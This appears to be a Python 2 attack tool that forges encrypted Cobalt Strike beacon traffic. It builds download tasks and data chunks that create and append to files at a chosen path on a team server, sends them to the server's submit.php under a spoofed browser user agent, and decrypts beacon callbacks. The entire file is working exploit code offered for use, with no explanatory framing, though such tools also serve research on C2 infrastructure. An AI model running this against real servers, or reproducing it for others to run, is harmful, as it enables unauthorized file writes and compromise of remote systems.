import base64
import binascii
import struct
import sys
import argparse

import requests

from pybeacon.tasks import BeaconReply, DownloadTask, DownloadWrite, counter, process_beacon_callback

"""
Script for dealing with symmetric encrypted beacon tasks
"""

def beacon_checkin(ipaddr, uri, data, bid):
    headers  = {
        'User-Agent': 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; GTB7.4; InfoPath.2)',
        'Content-Type': 'application/octet-stream',
    }
    requests.post('http://%s/%s' % (ipaddr, uri), data=data, headers=headers, params={'id': bid})

def download_task_data(filedata, fid, aes_key, hmac_key):
    # read the data to pack into callback
    with open(filedata, 'rb') as f:
        filebuf = f.read()

    # Build a DownloadWrite from thin air
    dt = DownloadWrite(
        fid=fid,
        filedata=filebuf,
        aes_key=binascii.unhexlify(aes_key),
        hmac_key=binascii.unhexlify(hmac_key)
        )
    dt.pack() # also encrypts
    dt.print_task() # pack before print_task so we get right flen

    buf = dt.data.read()
    data = base64.b64encode(struct.pack('>L', len(buf)) + buf)
    print "Data size: %s" % len(buf)
    print "Data: %s" % data
    return data  

def build_download_task(filepath, aes_key, hmac_key):
    # Build a DownloadTask from thin air
    dt = DownloadTask(
        fid=counter(),
        filename=filepath,
        aes_key=binascii.unhexlify(aes_key),
        hmac_key=binascii.unhexlify(hmac_key)
        )
    dt.pack() # also encrypts
    dt.print_task() # pack before print_task so we get right flen

    buf = dt.data.read()
    data = base64.b64encode(struct.pack('>L', len(buf)) + buf)
    print "Data size: %s" % len(buf)
    print "Data: %s" % data
    return data

def decrypt_callback(aes_key, hmac_key, data):
    reply = BeaconReply(
        data=data,
        aes_key=binascii.unhexlify(aes_key),
        hmac_key=binascii.unhexlify(hmac_key),
        cs_version=3)
    process_beacon_callback(reply)

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='Beacon task encryption tool')
    parser.add_argument('-a', '--aes', help='AES Key (hex encoded)', required=True)
    parser.add_argument('-k', '--hmac', help='HMAC Key (hex encoded)', required=True)
    parser.add_argument('-v3', help="Whether the target server is CS 3.0", action='store_true', default=False)
    parsers = parser.add_subparsers(dest='subparser_name', title='action')
    parsers.required = True
    
    download_parser = parsers.add_parser("download", help="Build a download task (creates file on server)")
    download_parser.add_argument('-f', '--filepath', help='Filepath of file to upload', required=True)

    download_data = parsers.add_parser("download_data", help="Checkin download data (appends to file on server)")
    download_data.add_argument('-f', '--filedata', help='File containing content to append to remote file', required=True)
    download_data.add_argument('-i', '--fid', help='File ID', required=True)

    checkin_parser = parsers.add_parser("checkin", help="Build a download task")
    checkin_parser.add_argument('-d', '--data', help='Task data to checkin (as base64)', required=True)
    checkin_parser.add_argument('-t', '--target', help='Target to send the data to', required=True)
    checkin_parser.add_argument('-b', '--bid', help='Beacon ID', required=True)

    decrypt_parser = parsers.add_parser("decrypt", help="Decrypt a task callback (client => server)")
    decrypt_parser.add_argument('-d', '--data', help='Task data to checkin (as base64)', required=True)
    args = parser.parse_args()
   
    if args.subparser_name == 'download':
        build_download_task(args.filepath, args.aes, args.hmac)
    elif args.subparser_name == 'download_data':
        download_task_data(args.filedata, args.fid, args.aes, args.hmac)
    elif args.subparser_name == 'checkin':
        beacon_checkin(args.target, 'submit.php', base64.b64decode(args.data), args.bid)
    elif args.subparser_name == 'decrypt':
        decrypt_callback(args.aes, args.hmac, base64.b64decode(args.data))
